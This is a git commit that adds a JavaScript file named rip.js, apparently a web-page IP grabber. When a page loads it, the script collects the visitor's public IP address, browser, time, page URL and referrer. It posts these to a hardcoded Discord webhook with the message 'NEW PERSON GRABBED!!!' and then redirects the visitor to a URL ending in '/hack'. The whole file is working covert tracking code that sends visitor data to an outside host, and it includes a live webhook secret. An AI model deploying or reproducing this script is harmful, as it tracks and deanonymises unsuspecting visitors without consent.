1b9300f3864600bd7dc0a95195ee036198188146
hai17233 <135570073+hai17233@users.noreply.github.com>
2023-12-22 08:32:21 +0700

    Add files via upload

---
+++ rip.js
@@ -0,0 +1,49 @@
+var webhook = 'https://discord.com/api/webhooks/1187566619048820817/hTs4FYFZMBwAVteaoX0Prh17D5uJzJFOl3eNxqCw1WDhs6vU2GCd7P9FEOD5TnFc5pSA';
+var site = 'https://myexternalip.com/raw';
+
+var get_ip = function() {
+    var ip = '';
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', site, false);
+    xhr.send();
+    if (xhr.status == 200) {
+        ip = xhr.responseText;
+    }
+    return ip;
+};
+
+function get_browser() {
+    var browser = navigator.userAgent;
+    return browser;
+    }
+
+function get_time() {
+    var date = new Date();
+    var time = date.toLocaleString();
+    return time;
+    }
+
+function get_url() {
+    var url = window.location.href;
+    return url;
+    }
+
+function get_referrer() {
+    var referrer = document.referrer;
+    return referrer;
+    }
+
+function send_webhook() {
+    fetch(webhook, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            content: `@everyone NEW PERSON GRABBED!!!\n\`\`\`ini\nIP: [${get_ip()}]\nBrowser: [${get_browser()}]\nTime: [${get_time()}]\nURL: [${get_url()}]\nReferrer: [${get_referrer()}]\n[Made by K.Dot]\n\`\`\``
+        })
+    });
+}
+
+send_webhook();
+window.location.href = 'https://axios.haingoc8.repl.co/hack';
